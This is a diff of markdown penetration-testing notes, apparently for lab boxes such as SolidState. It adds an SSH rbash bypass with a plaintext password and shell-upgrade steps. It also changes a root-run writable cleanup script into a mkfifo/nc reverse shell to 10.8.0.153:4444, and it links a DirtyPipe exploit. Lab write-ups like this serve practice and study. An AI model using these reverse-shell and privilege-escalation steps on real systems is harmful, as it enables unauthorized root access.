@@ -132,13 +132,35 @@ username: mindy
 pass: P@55W0rd1!2@
 ```
 
-##### rbash bypass
+### priviledge escalation
+
+#### rbash bypass
 
 ```bash
 ssh mindy@172.16.33.35 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+P@55W0rd1!2@
 ```
 
-### priviledge escalation
+#### full pty
+
+```bash
+bash
+
+stty -a
+speed 38400 baud; rows 48; columns 176; line = 0;
+
+control + z
+stty raw -echo
+fg
+```
+
+if use rbash bypass to get a ssh shell, we get a full pty now!!! and don't need to use the following command.
+
+```bash
+export SHELL=bash
+export TERM=xterm
+stty rows 48 columns 176
+```
 
 #### information gathering
 
@@ -155,6 +177,9 @@ Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
 find / -type f -user root -perm -o=w 2>/dev/null | grep -v 'proc\|sys'
 /opt/tmp.py
 
+ls -l /opt/tmp.py
+-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
+
 cat /opt/tmp.py
 #!/usr/bin/env python
 import os
@@ -168,37 +193,21 @@ except:
 the script is used to delete all files in /tmp, and it is owned by root, and it is writable.
 it looks like the script is used to clean the /tmp directory regularly, and it is a good place to put a reverse shell.
 
-#### full pty
+#### reverse shell
 
 ```bash
-stty -a
-speed 38400 baud; rows 0; columns 0; line = 0;
-intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>;
-eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
-werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
--parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
--ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff
--iuclc -ixany -imaxbel -iutf8
-opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
-isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt
-echoctl echoke -flusho -extproc
-
-stty raw -echo
-fg
-export TERM=xterm
-stty rows 38 columns 116
-```
-
-```bash
-find / -perm -u=s -type f 2>/dev/null
-find / -type f -user root -perm -o=w 2>/dev/null | grep -v '/proc/|/sys/'
-
-cat <<< AAA > /opt/tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+  os.system('rm -r /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.153 4444 >/tmp/f')
+except:
+  sys.exit()
 ```
 
 #### dirtypipe
 
-https://
+<https://haxx.in/files/dirtypipez.c>
 
 ## 172.16.33.30 - FUNBOX: ROOKIE
 
